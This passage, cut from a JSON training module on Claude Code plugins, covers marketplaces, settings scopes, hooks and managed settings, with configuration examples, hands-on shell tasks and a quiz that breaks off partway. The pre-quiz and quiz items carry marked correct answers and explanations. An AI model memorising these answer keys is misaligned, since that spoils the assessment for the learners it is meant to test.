A stale manifest version masks the value in `marketplace.json`. Avoid setting `version` in both places; pick one source of truth.\n\n### Pitfall 10: `enabledPlugins` written as array of objects\n\nIn user, project, and local settings, `enabledPlugins` is a **keyed object** (`{\"plugin@marketplace\": true}`), not an array. Writing it as `[{\"marketplace\": \"...\", \"plugin\": \"...\"}]` is incorrect and will be silently ignored or cause a parse error."
   },
   {
    "heading": "A Complete Team Distribution Example",
    "body": "This example wires together all the concepts: a private GitHub marketplace, a plugin with a pinned version, project-scope distribution via VCS, and a managed settings layer for the security team.\n\n### Repository layout (`example-org/claude-plugins`)\n\n```\nclaude-plugins/\n├── .claude-plugin/\n│   └── marketplace.json\n└── plugins/\n    └── platform-linter/\n        ├── .claude-plugin/\n        │   └── plugin.json\n        ├── skills/\n        │   └── run-linter/\n        │       └── SKILL.md\n        ├── hooks/\n        │   └── hooks.json\n        └── bin/\n            └── lint-runner\n```\n\n### `marketplace.json`\n\n```json\n{\n  \"name\": \"example-platform\",\n  \"owner\": { \"name\": \"Platform Team\", \"email\": \"platform@example.com\" },\n  \"plugins\": [\n    {\n      \"name\": \"platform-linter\",\n      \"source\": \"./plugins/platform-linter\",\n      \"description\": \"Enforces platform coding standards\",\n      \"defaultEnabled\": false\n    }\n  ]\n}\n```\n\n### `plugins/platform-linter/.claude-plugin/plugin.json`\n\n```json\n{\n  \"name\": \"platform-linter\",\n  \"version\": \"1.3.0\",\n  \"description\": \"Platform coding standard enforcement\"\n}\n```\n\n### `plugins/platform-linter/hooks/hooks.json`\n\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"\\\"${CLAUDE_PLUGIN_ROOT}\\\"/bin/lint-runner \\\"${CLAUDE_PROJECT_DIR}\\\"\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Team repo's `.claude/settings.json` (committed)\n\n```json\n{\n  \"extraKnownMarketplaces\": {\n    \"example-platform\": {\n      \"source\": {\n        \"source\": \"github\",\n        \"repo\": \"example-org/claude-plugins\"\n      }\n    }\n  },\n  \"enabledPlugins\": {\n    \"platform-linter@example-platform\": true\n  }\n}\n```\n\n### Admin `/etc/claude-code/managed-settings.json` (enforced for security team)\n\n```json\n{\n  \"strictKnownMarketplaces\": [\n    { \"source\": \"github\", \"repo\": \"example-org/claude-plugins\" }\n  ],\n  \"extraKnownMarketplaces\": {\n    \"example-platform\": {\n      \"source\": {\n        \"source\": \"github\",\n        \"repo\": \"example-org/claude-plugins\"\n      }\n    }\n  },\n  \"allowManagedHooksOnly\": true,\n  \"enabledPlugins\": {\n    \"platform-linter@example-platform\": true\n  },\n  \"pluginTrustMessage\": \"Plugins from example-platform are approved by Security\"\n}\n```\n\n### What happens for each persona\n\n- **New team member:** clones repo, opens Claude Code, trusts project folder. `example-platform` marketplace is registered automatically; `platform-linter` is enabled at project scope. Because `defaultEnabled: false` is in the marketplace entry, a user at user scope would need to opt in — but the project-scope `enabledPlugins` entry overrides that and enables it for everyone in the repo.\n- **Personal preference:** can add personal plugins from public marketplaces at user scope; their team's `enabledPlugins` from project scope still applies.\n- **Security team member:** managed settings additionally enforce `allowManagedHooksOnly` — only the managed-enabled `platform-linter` hooks run; no user-defined hooks fire.\n- **Plugin update:** Platform team bumps `version` in `plugin.json` to `1.4.0` and pushes. On next session start (or auto-update), Claude Code detects the new version string and updates automatically."
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your team adds a plugin at project scope and commits `.claude/settings.json` to the repo. A new engineer clones the repo and opens it in Claude Code for the first time. What actually happens?",
    "options": [
     "Nothing — they must run `claude plugin install` manually before any plugin installs.",
     "They are auto-prompted to install the org marketplace and plugins because the trusted repo contains `extraKnownMarketplaces` and `enabledPlugins` in `.claude/settings.json`.",
     "The plugin installs silently and automatically without any prompt, because `.claude/settings.json` is trusted VCS content.",
     "They must first run `claude plugin marketplace add` before the auto-prompt appears, because marketplace registration is per-user."
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "Project-scope `enabledPlugins` and `extraKnownMarketplaces` in `.claude/settings.json` cause Claude Code to auto-prompt collaborators to install the org marketplace and plugins when they trust the repo folder — no manual `marketplace add` per person, but it is a prompt, not a silent install."
   },
   {
    "prompt": "Your CI pipeline runs `claude plugin install formatter@your-org` without specifying a scope. Where does the enabled state get written, and who is affected?",
    "options": [
     "To `.claude/settings.json` (project scope), affecting all repo collaborators.",
     "To `~/.claude/settings.json` (user scope), affecting only the CI user identity and all its projects.",
     "To `.claude/settings.local.json` (local scope), affecting only the CI runner for this repo.",
     "To `managed-settings.json`, making it read-only for all users."
    ],
    "correct": 1,
    "sectionIndices": [
     0,
     1
    ],
    "explanation": "Without `--scope`, `claude plugin install` defaults to user scope and writes to `~/.claude/settings.json`, affecting the CI user identity across all projects. To scope to the repo and share via VCS, you must pass `--scope project`."
   },
   {
    "prompt": "You run `/plugin marketplace add your-org/claude-plugins` in one worktree and then open a second worktree of the same repo. Is the marketplace registration available in the second worktree?",
    "options": [
     "No — worktrees each have their own `.claude/` directory, so the registration only applies where you ran the command.",
     "Yes — marketplace registration is stored once per user in `~/.claude/plugins/known_marketplaces.json`, not per-project, so all worktrees share it.",
     "Only if you ran the command with `--scope project` so it was committed to `.claude/settings.json`.",
     "No — you must re-run `marketplace add` in every new session, because it is session-state only."
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "Marketplace registration state lives in `~/.claude/plugins/known_marketplaces.json`, once per user. Worktrees share this file, so a marketplace added in one worktree is immediately visible in another — no need to re-register per worktree or per project."
   },
   {
    "prompt": "After installing a new plugin mid-session you run `/reload-plugins`. The session immediately errors: 'Refusing to reload: pass --force'. What is the most likely cause?",
    "options": [
     "The plugin contains a syntax error in `plugin.json` that the validator caught.",
     "You do not have write permission to `~/.claude/plugins/`.",
     "The plugin ships a non-deferred MCP server, which would invalidate the prompt cache and force a full re-read; Claude Code v2.1.163+ refuses this without `--force`.",
     "The plugin's hooks are not marked executable, so the reload is blocked as a safety measure."
    ],
    "correct": 2,
    "sectionIndices": [
     1
    ],
    "explanation": "v2.1.163+ shows a warning and refuses `/reload-plugins` unless you pass `--force` when the new plugin includes a non-deferred MCP server, because loading it invalidates the prompt cache and forces a full context re-read — a significant token cost."
   },
   {
    "prompt": "You want CI to check whether any installed plugins have errors. Which command gives you machine-readable output suitable for scripting?",
    "options": [
     "`/plugin list --enabled` — its exit code is non-zero if any plugin has errors.",
     "`claude plugin list --json` — read each plugin's `errors` field.",
     "`claude plugin validate` — it prints errors in JSON by default.",
     "`claude plugin marketplace update --json` — the update output includes plugin error state."
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "The content explicitly recommends `claude plugin list --json` for CI/health checks because you can read each plugin's `errors` field, rather than parsing human-readable output. The slash commands are for interactive sessions, not scripting."
   },
   {
    "prompt": "A teammate tries to install a plugin but gets 'not found in any marketplace'. The official marketplace was auto-added when they first launched Claude Code interactively months ago. What is the most likely fix?",
    "options": [
     "Run `claude plugin marketplace add anthropics/claude-plugins-official` to re-add the marketplace from scratch.",
     "Run `/plugin marketplace update claude-plugins-official` to refresh the catalog from its source.",
     "Submit the plugin to the community marketplace — official plugins are always available once submitted.",
     "Add `extraKnownMarketplaces` to the project `.claude/settings.json` pointing to the official repo."
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "When a plugin is 'not found in any marketplace,' the marketplace catalog is stale (not missing). `/plugin marketplace update claude-plugins-official` refreshes it. Re-adding with `marketplace add` is only needed if it was never added in the first place (e.g., non-interactive scripts)."
   },
   {
    "prompt": "Your security team wants to self-submit a tool to the official `claude-plugins-official` marketplace so it's available to all org users. Is this possible?",
    "options": [
     "Yes — submit via the `/plugin` Discover tab's in-app submission form.",
     "No — in-app submission forms go to the community marketplace, not the official one. The official catalog is curated by Anthropic; you cannot self-submit to it.",
     "Yes — submit at platform.claude.com/plugins/submit and it appears in the official catalog after approval.",
     "Yes — add your plugin to the `claude-plugins-official` GitHub repo via pull request."
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "You cannot self-submit to the official catalog — it is curated at Anthropic's discretion. In-app submission forms go to the *community* marketplace. Community approval requires a Team/Enterprise org with directory-management access; individuals use the Console form at platform.claude.com/plugins/submit."
   },
   {
    "prompt": "You create a plugin and want to ship instructions that appear as Claude's context when the plugin is active. You place a `CLAUDE.md` at the plugin root directory. Will this work?",
    "options": [
     "Yes — `CLAUDE.md` at plugin root is loaded as context for all sessions where the plugin is enabled.",
     "No — a plugin-root `CLAUDE.md` is NOT loaded as context. Ship instructions as a skill, not a `CLAUDE.md`.",
     "Only if you declare the `CLAUDE.md` path in `plugin.json` under the `context` field.",
     "Yes — but only for agents defined in the plugin, not for general sessions."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "A `CLAUDE.md` at the plugin root is NOT loaded as context. Plugins contribute context only via skills, agents, and hooks. The correct approach is to ship instructions as a skill (SKILL.md with frontmatter)."
   },
   {
    "prompt": "You are converting a standalone `.claude/` config into a plugin and move skills and agents to the plugin root. After enabling the plugin you notice Claude uses old agent definitions instead of the plugin's agents. What went wrong?",
    "options": [
     "Plugin agents must be declared in `plugin.json` under an `agents` field or they are ignored.",
     "You left the original agent files in `.claude/agents/` — project/user `.claude/agents/` override same-named plugin agents, causing the plugin agents to be shadowed.",
     "Agents in plugins require a `hooks` field in their frontmatter to be loaded.",
     "The plugin was installed at user scope but the old `.claude/agents/` are at project scope, so project scope wins."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "When converting a standalone config to a plugin, you must delete the original `.claude/` files. Leftover files cause duplicate skills and shadow plugin agents: project/user `.claude/agents/` override same-named plugin agents."
   },
   {
    "prompt": "You author a plugin with a single skill at the plugin root (`SKILL.md` with no `skills/` directory). After every update, users report the invocation name changes. What is missing?",
    "options": [
     "A `skills/` directory — single-skill plugins at root are not supported; the name always derives from directory.",
     "A `name` field in the SKILL.md frontmatter — without it the invocation name falls back to the install-dir version string, which changes on every update.",
     "A `displayName` in `plugin.json` — without it Claude Code derives the name from the manifest version.",
     "The `version` field in `plugin.json` — an unversioned plugin cannot have a stable invocation name."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "For single-skill plugins at the plugin root (supported since v2.1.142+), you must set the `name` frontmatter field in SKILL.md. Without it, the invocation name falls back to the install-dir version string, which changes on every plugin update."
   },
   {
    "prompt": "A plugin hook that should fire after every file write is silently not firing. The hook command is valid shell. What is the most likely cause?",
    "options": [
     "The hook is defined in `hooks/hooks.json` but should be in `.claude/settings.json` to fire.",
     "The hook event name uses `postToolUse` (lowercase) instead of the required `PostToolUse` (PascalCase) — hook event names are case-sensitive.",
     "The hook type is `command` but file-write events require type `http`.",
     "Plugin hooks only fire during worktree sessions, not in the default session."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "Hook event names are case-sensitive. `postToolUse` is silently ignored; the correct name is `PostToolUse`. Additionally, non-executable scripts silently don't fire (`chmod +x` required), but the question specifies a valid shell command, making case-sensitivity the most likely culprit."
   },
   {
    "prompt": "A plugin agent's frontmatter includes `permissionMode: acceptEdits`. After shipping the plugin, you notice the permission mode is not applied. Why?",
    "options": [
     "Plugin agents do not support frontmatter at all — all configuration must go in `plugin.json`.",
     "For security, `hooks`, `mcpServers`, and `permissionMode` are NOT supported in plugin-shipped agents — they are silently ignored.",
     "`permissionMode` is only honored in user-scope agents, not plugin-bundled agents.",
     "You must set `permissionMode` in the plugin's `settings.json`, not in the agent frontmatter."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "Plugin agents support `name, description, model, effort, maxTurns, tools, disallowedTools, skills, memory, background, isolation` in frontmatter, but `hooks`, `mcpServers`, and `permissionMode` are explicitly NOT supported and are silently ignored for security reasons."
   },
   {
    "prompt": "Your plugin installs a Python venv for a bundled tool. After an update the venv is gone. Where should the plugin have written the venv to survive updates?",
    "options": [
     "Inside the plugin directory at `${CLAUDE_PLUGIN_ROOT}/venv/` — this is the plugin's home directory.",
     "At `${CLAUDE_PLUGIN_DATA}` (`~/.claude/plugins/data/{id}/`) — this is the persistent state dir that survives updates.",
     "At `~/.claude/plugins/{plugin-name}/venv/` — the standard plugin state location.",
     "Inside the project directory at `.claude/plugin-data/{plugin-name}/` — project-scoped plugins use project-local storage."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "`${CLAUDE_PLUGIN_ROOT}` is the install directory and CHANGES on every update. `${CLAUDE_PLUGIN_DATA}` maps to `~/.claude/plugins/data/{id}/` and is the persistent state directory that survives updates — the correct place to install deps and persistent state."
   },
   {
    "prompt": "You add a `userConfig` entry with `sensitive: true` to collect an API key. A user with many other plugins and OAuth tokens enabled reports the key cannot be saved. What is the constraint you hit?",
    "options": [
     "`sensitive: true` entries require a Team/Enterprise org — individual licenses store secrets in settings.json only.",
     "The system keychain has a ~2KB total budget shared with OAuth tokens. With many plugins and tokens, the budget is exhausted and sensitive config cannot be stored.",
     "Sensitive config requires the user to explicitly unlock the keychain first with `claude plugin unlock-keychain`.",
     "`sensitive: true` is only honored for `string` type config; other types always go to settings.json."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "Sensitive `userConfig` values are stored in the system keychain (or `~/.claude/.credentials.json`), which has a ~2KB total budget shared with all OAuth tokens. A user with many plugins and tokens can exhaust this budget, making it impossible to store additional secrets."
   },
   {
    "prompt": "In a `marketplace.json` plugin entry you set both `ref: 'v1.2.0'` and `sha: 'abc123...'`. The `v1.2.0` tag is later deleted from the upstream repo. What happens when a user installs this plugin?",
    "options": [
     "Installation fails — `ref` and `sha` cannot both be set; only one is honored.",
     "Installation uses the tag name `v1.2.0`; since the tag is deleted, the install fails.",
     "Installation succeeds using the SHA `abc123...` — when both are set, `sha` is the effective pin and survives tag deletion as long as the commit is reachable.",
     "Installation falls back to the `main` branch since neither `ref` nor `sha` resolved cleanly."
    ],
    "correct": 2,
    "sectionIndices": [
     5
    ],
    "explanation": "When both `ref` and `sha` are set in a plugin source, `sha` is the effective pin. The install fetches by SHA directly, so it survives deletion of the named branch or tag upstream as long as the commit remains reachable in the remote repository."
   },
   {
    "prompt": "You publish a marketplace with `strict: false` on a plugin entry. The plugin directory contains a `plugin.json` that declares several components. What happens at install time?",
    "options": [
     "The `plugin.json` is authoritative — `strict: false` only adds marketplace metadata but never overrides plugin.json.",
     "The marketplace entry is the entire definition and any `plugin.json` declaring components fails to load — `strict: false` lets the marketplace operator curate the plugin without a plugin.json.",
     "`strict: false` means validation is skipped, so both `plugin.json` and the marketplace entry are merged with no conflict errors.",
     "The plugin installs without any components — `strict: false` disables component auto-discovery."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "With `strict: false` the marketplace entry is the entire plugin definition. Any `plugin.json` that declares components fails to load — this allows a marketplace operator to curate/override plugin definitions without the plugin author's `plugin.json` taking precedence."
   }
  ],
  "tasks": [
   {
    "id": "stage6-task-project-scope-plugin",
    "afterSectionIdx": 0,
    "title": "Add a marketplace and install a plugin at project scope",
    "instructions": "This task gives you concrete experience with the project-scope distribution flow.\n\n1. Navigate to a test git repo (or create one: `mkdir /tmp/claude-plugin-test && cd /tmp/claude-plugin-test && git init`).\n\n2. Add the official marketplace at **project scope**:\n```bash\nclaude plugin marketplace add anthropics/claude-plugins-official --scope project\n```\n\n3. Verify the `extraKnownMarketplaces` entry was written to `.claude/settings.json` (not `~/.claude/settings.json`):\n```bash\ncat .claude/settings.json\n```\n\n4. Install a plugin at project scope (use any available plugin, e.g. `git` if available, or list what's available first with `claude plugin list --available --json`):\n```bash\nclaude plugin install <name>@claude-plugins-official --scope project\n```\n\n5. Confirm `enabledPlugins` now appears in `.claude/settings.json`:\n```bash\ncat .claude/settings.json\n```\n\n6. Check that `~/.claude/settings.json` was NOT modified (the install should only be in the project file):\n```bash\ngrep -c 'enabledPlugins' ~/.claude/settings.json || echo 'not in user settings'\n```",
    "doneWhen": "`.claude/settings.json` contains both `extraKnownMarketplaces` and `enabledPlugins` entries, and `~/.claude/settings.json` does not contain the same plugin in `enabledPlugins`."
   },
   {
    "id": "stage6-task-author-minimal-plugin",
    "afterSectionIdx": 3,
    "title": "Author a minimal plugin with a named skill",
    "instructions": "Build the smallest valid plugin structure, focusing on the layout rules and the single-skill naming pitfall.\n\n1. Create the plugin directory structure:\n```bash\nmkdir -p /tmp/my-test-plugin/.claude-plugin\n```\n\n2. Write the manifest at `.claude-plugin/plugin.json` (only `plugin.json` goes here — NOT skills):\n```bash\ncat > /tmp/my-test-plugin/.claude-plugin/plugin.json << 'EOF'\n{\n  \"name\": \"my-test-plugin\",\n  \"description\": \"Minimal plugin for learning stage-6\",\n  \"version\": \"1.0.0\",\n  \"author\": \"Your Name\"\n}\nEOF\n```\n\n3. Create the skill at the **plugin root** (not inside `.claude-plugin/`):\n```bash\ncat > /tmp/my-test-plugin/SKILL.md << 'EOF'\n---\nname: greet\ndescription: Greets the user by name. Invoke with /my-test-plugin:greet.\n---\n\nGreet the user warmly, addressing them by name if provided.\nEOF\n```\n\n4. Install the plugin from local path (at user scope for this exercise):\n```bash\nclaude plugin install /tmp/my-test-plugin\n```\n\n5. Verify the install and confirm no errors:\n```bash\nclaude plugin list --json | python3 -c \"import sys,json; plugins=json.load(sys.stdin); [print(p['name'], 'errors:', p.get('errors','none')) for p in plugins]\"\n```\n\n6. Inside a Claude Code session, confirm the skill is invocable as `/my-test-plugin:greet`.",
    "doneWhen": "`claude plugin list --json` shows your plugin with an empty `errors` field, and you can invoke `/my-test-plugin:greet` in a Claude Code session."
   },
   {
    "id": "stage6-task-marketplace-json",
    "afterSectionIdx": 5,
    "title": "Create a private Git marketplace definition",
    "instructions": "Author a `marketplace.json` that references your local plugin, simulating what a team would commit to a private `your-org/claude-plugins` repo.\n\n1. Create the marketplace repo directory:\n```bash\nmkdir -p /tmp/my-org-marketplace/.claude-plugin\n```\n\n2. Place a local plugin at a relative path inside it:\n```bash\nmkdir -p /tmp/my-org-marketplace/plugins/greeter/.claude-plugin\ncat > /tmp/my-org-marketplace/plugins/greeter/.claude-plugin/plugin.json << 'EOF'\n{\"name\": \"greeter\", \"description\": \"Team greeter plugin\"}\nEOF\ncat > /tmp/my-org-marketplace/plugins/greeter/SKILL.md << 'EOF'\n---\nname: hello\ndescription: Says hello from the team plugin.\n---\nSay: Hello from the team marketplace!\nEOF\n```\n\n3. Write the marketplace definition at `.claude-plugin/marketplace.json` (at the **repo root**, not inside the plugin):\n```bash\ncat > /tmp/my-org-marketplace/.claude-plugin/marketplace.json << 'EOF'\n{\n  \"name\": \"my-org-plugins\",\n  \"owner\": {\"name\": \"My Org\", \"email\": \"admin@example.com\"},\n  \"plugins\": [\n    {\n      \"name\": \"greeter\",\n      \"source\": \"./plugins/greeter\",\n      \"defaultEnabled\": false,\n      \"displayName\": \"Team Greeter\"\n    }\n  ]\n}\nEOF\n```\n\n4. Register the local marketplace:\n```bash\nclaude plugin marketplace add /tmp/my-org-marketplace\n```\n\n5. Verify it appears in the marketplace list:\n```bash\nclaude plugin marketplace list\n```\n\n6. Install the plugin from your new marketplace:\n```bash\nclaude plugin install greeter@my-org-plugins\n```",
    "doneWhen": "`claude plugin marketplace list` shows `my-org-plugins` and `claude plugin list` shows the `greeter` plugin installed from it."
   }
  ],
  "visualizations": [
   {
    "id": "stage-6-v",
    "kind": "comparison-table",
    "title": "Plugins & distribution",
    "textualSummary": "Key concepts of Plugins & distribution: plugin, marketplace, settings scope.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "plugin",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "marketplace",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "settings scope",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "project-scope distribution via VCS",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Plugins & distribution.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-6-q1",
    "type": "multiple-choice",
    "prompt": "Your team adds a private Git marketplace and installs a linting plugin at project scope, then commits `.claude/settings.json`. A new hire clones the repo. What happens when she opens the project in Claude Code for the first time?",
    "options": [
     "The marketplace and plugin are silently active — no prompt is shown because everything is checked into VCS.",
     "She is auto-prompted to install the org marketplace and plugin because they are in the trusted project's `.claude/settings.json`.",
     "She must manually run `claude plugin marketplace add` and `claude plugin install` because marketplace registration is per-user.",
     "The plugin is installed at user scope on her machine, overriding the project-scope intent."
    ],
    "correct": 1,
    "explanation": "The content states: 'Collaborators are then auto-prompted to install the org marketplace/plugins when they trust the repo folder — no manual `marketplace add` per person.' The marketplace and plugin settings in `.claude/settings.json` trigger an install prompt on first trust, not silent activation (option A is wrong) and not a fully manual process (option C is wrong). The scope stays project, not user (option D is wrong)."
   },
   {
    "id": "stage-6-q2",
    "type": "multiple-choice",
    "prompt": "An admin wants certain security-hardening plugins to be impossible for individual developers to disable. Which scope achieves this, and why?",
    "options": [
     "Project scope — because `.claude/settings.json` is checked into VCS, developers cannot change it without a code review.",
     "User scope with `--force` — because user settings override all other scopes.",
     "Managed settings — because managed settings are read-only and users cannot modify or remove them.",
     "Local scope — because `.claude/settings.local.json` is gitignored and therefore invisible to regular developers."
    ],
    "correct": 2,
    "explanation": "The content explicitly says managed settings are 'Installed by admins; read-only, users cannot modify/remove.' Project scope (option A) requires a VCS PR, but any developer can locally override it with user or local scope — it is not truly read-only for the running process. User scope with `--force` (option B) is not a real mechanism and user settings don't enforce policy. Local scope (option D) is the opposite of what's needed — it's per-person and optional."
   },
   {
    "id": "stage-6-q3",
    "type": "multiple-choice",
    "prompt": "A developer runs `/reload-plugins` after enabling a new MCP-server-backed plugin mid-session. Claude Code prints a warning and refuses to proceed. What is the most likely cause?",
    "options": [
     "The plugin's `plugin.json` manifest is malformed and the validator caught it.",
     "The plugin contains non-deferred MCP servers, which would invalidate the prompt cache and force a full re-read; the tool requires `--force` to proceed.",
     "The developer lacks permission to reload MCP servers without restarting Claude Code entirely.",
     "The reload failed because marketplace registration is stored per-user and the current session has not yet synced."
    ],
    "correct": 1,
    "explanation": "The content states: 'a plugin with non-deferred MCP servers invalidates the prompt cache and forces a full re-read. v2.1.163+ shows a warning and refuses unless you pass `--force`.' Manifest validation errors (option A) would surface as errors, not a warning-plus-refusal gate. There is no per-permission-level restriction on reloading (option C). Marketplace sync (option D) is unrelated to the reload-plugins warning."
   },
   {
    "id": "stage-6-q4",
    "type": "multiple-choice",
    "prompt": "A teammate authors a plugin and places a `CLAUDE.md` file at the plugin root to give context to users. After installing the plugin, users report that the instructions never appear. What is the actual problem?",
    "options": [
     "The `CLAUDE.md` file must be inside `.claude-plugin/` to be picked up at load time.",
     "A plugin-root `CLAUDE.md` is not loaded as context; plugins contribute context only via skills, agents, and hooks.",
     "The plugin must declare the `CLAUDE.md` in its manifest under a `contextFiles` field.",
     "The `CLAUDE.md` is only loaded if the user has the plugin enabled at user scope, not project scope."
    ],
    "correct": 1,
    "explanation": "The content is explicit: 'a plugin-root CLAUDE.md is NOT loaded as context. Plugins contribute context only via skills/agents/hooks.' The correct approach is to ship instructions as a skill. Option A is wrong — `.claude-plugin/` holds only `plugin.json`. Option C invents a non-existent `contextFiles` field. Option D incorrectly ties context loading to scope."
   },
   {
    "id": "stage-6-q5",
    "type": "multiple-choice",
    "prompt": "You author a single-skill plugin and omit `name` from the `SKILL.md` frontmatter. After publishing an update, users complain the slash-command invocation name changed. What caused this?",
    "options": [
     "The plugin manifest's `displayName` field was also changed, and `displayName` is used for skill namespacing.",
     "Without a frontmatter `name`, the invocation name falls back to the install-directory version string, which changes on every update.",
     "The marketplace re-pinned the plugin to a new SHA, which resets the skill namespace.",
     "Omitting `name` causes the skill to use the plugin `name` field from `plugin.json` as its invocation name, and the plugin was renamed."
    ],
    "correct": 1,
    "explanation": "The content states: 'Set frontmatter `name` or the invocation name falls back to the install-dir version string (changes every update).' `displayName` (option A) is explicitly described as 'UI-only, not used for namespacing.' SHA-pinning (option C) controls source integrity, not skill invocation names. The plugin `name` field is the namespace (option D), not the per-skill invocation name — and it would only change if the plugin itself were renamed."
   },
   {
    "id": "stage-6-q6",
    "type": "multiple-choice",
    "prompt": "Your organization wants to submit a plugin to be publicly discoverable and used by the broader Claude Code community. Where should the plugin be submitted, and through what channel?",
    "options": [
     "Submit to the official `claude-plugins-official` marketplace via a pull request to the Anthropic-curated GitHub repo.",
     "Submit to the community marketplace via the in-app submission form or the Console form at platform.claude.com/plugins/submit; individuals use the Console form.",
     "Post the plugin to the official marketplace by opening an issue on the official catalog repository — all submissions are reviewed on a first-come basis.",
     "Create an npm package with a `claude-plugin` keyword; it is auto-indexed into the official marketplace nightly."
    ],
    "correct": 1,
    "explanation": "The content states: 'In-app submission forms go to the community marketplace, not the official one — you cannot self-submit to the official catalog (it's curated at Anthropic's discretion). Community approval needs a Team/Enterprise org with directory-management access; individuals use the Console form at platform.claude.com/plugins/submit.' Options A and C incorrectly describe the official marketplace as open for self-submission. Option D invents an npm-keyword auto-indexing mechanism."
   },
   {
    "id": "stage-6-q7",
    "type": "multiple-choice",
    "prompt": "A marketplace `plugin.json` entry sets both `ref: 'v2.0'` and `sha: 'a3f8c1d...'`. The team later deletes the `v2.0` tag from GitHub. Will installs still succeed?",
    "options": [
     "No — without the named ref, the installer cannot resolve the source and the install fails.",
     "Yes — when both are set, `sha` is the effective pin; the install succeeds as long as the commit is reachable.",
     "Yes — but only if the marketplace catalog is refreshed before the tag deletion propagates.",
     "No — plugin sources must use either `ref` or `sha`, not both; the conflict causes a load error."
    ],
    "correct": 1,
    "explanation": "The content states: 'When both `ref` and `sha` are set, `sha` is the effective pin — install survives deletion of the named branch/tag upstream as long as the commit is reachable.' Option A is wrong because sha takes priority over the ref name. Option C invents a catalog-refresh dependency. Option D is wrong — the content describes using both as a valid and intentional pattern, not a conflict."
   },
   {
    "id": "stage-6-q8",
    "type": "multiple-choice",
    "prompt": "A developer writes a plugin hook script but it never fires, even though the hook is correctly listed in `hooks/hooks.json`. The most common silent failure cause is:",
    "options": [
     "The event name uses lowercase (`postToolUse`) instead of the required PascalCase (`PostToolUse`).",
     "The hook script was not added to `bin/` so it isn't on the PATH.",
     "The `hooks/hooks.json` must redeclare the hook type in the plugin manifest `plugin.json`.",
     "Hooks in plugins only fire in interactive sessions, not in non-interactive `claude` CLI invocations."
    ],
    "correct": 0,
    "explanation": "The content states: 'Hook event names are case-sensitive (`PostToolUse`, not `postToolUse`).' A second silent failure is the script not being executable (`chmod +x`), but between these options only the case-sensitivity issue is directly quoted. Option B confuses PATH executables (in `bin/`) with hook scripts. Option C invents a manifest redeclaration requirement. Option D is not stated and confuses monitors (which run only in interactive sessions) with hooks."
   },
   {
    "id": "stage-6-q9",
    "type": "multi-select",
    "prompt": "Your team is converting a standalone `.claude/` config directory into a distributable plugin. Select ALL steps that the content identifies as required or explicitly recommended during this conversion.",
    "options": [
     "Create a `.claude-plugin/` directory and add `plugin.json` inside it.",
     "Move hooks into `hooks/hooks.json` at the plugin root.",
     "Delete the original `.claude/` files after copying components to the plugin root.",
     "Place component directories (`skills/`, `agents/`, etc.) inside `.claude-plugin/` alongside `plugin.json`.",
     "Move the plugin root `CLAUDE.md` into a skill so it is loaded as context."
    ],
    "correct": [
     0,
     1,
     2,
     4
    ],
    "explanation": "The content lists: 'mkdir .claude-plugin/, add plugin.json, copy commands/agents/skills/ to plugin root, move hooks into hooks/hooks.json. Then delete the original .claude/ files — leftovers cause duplicate skills and shadow plugin agents.' It also says plugin-root CLAUDE.md is not loaded; instructions should be shipped as a skill. Option D is explicitly wrong: 'All component dirs go at the plugin ROOT, never inside .claude-plugin/ (only plugin.json lives there).'"
   },
   {
    "id": "stage-6-q10",
    "type": "multi-select",
    "prompt": "Which of the following are true about `userConfig` fields in a plugin manifest? Select ALL that apply.",
    "options": [
     "Values marked `sensitive: true` are stored in the system keychain or `~/.claude/.credentials.json` instead of `settings.json`.",
     "The keychain has an unlimited storage capacity for sensitive config values.",
     "Config values are substituted in skill/agent content as `${user_config.KEY}` and exported as `CLAUDE_PLUGIN_OPTION_<KEY>`.",
     "Non-sensitive values are written to `pluginConfigs[<plugin-id>].options` in `settings.json`.",
     "Users are prompted to enter `userConfig` values the first time they run any skill, not at enable time."
    ],
    "correct": [
     0,
     2,
     3
    ],
    "explanation": "The content confirms: (A) '`sensitive: true` masks input and stores in the system keychain (or `~/.claude/.credentials.json`) instead of settings.json'; (C) 'Substituted as `${user_config.KEY}` and exported as `CLAUDE_PLUGIN_OPTION_<KEY>`'; (D) 'Non-sensitive values go to `pluginConfigs[<plugin-id>].options` in settings.json.' Option B is wrong — the content says the keychain has a '~2KB total budget shared with OAuth tokens, so keep secrets small.' Option E is wrong — the content says users are prompted 'at enable time', not on first skill run."
   },
   {
    "id": "stage-6-q11",
    "type": "multiple-choice",
    "prompt": "A marketplace operator wants to ship a curated plugin catalog where each entry's marketplace metadata completely defines the plugin — no `plugin.json` in the plugin repo should be respected. Which `marketplace.json` field achieves this, and what is its effect?",
    "options": [
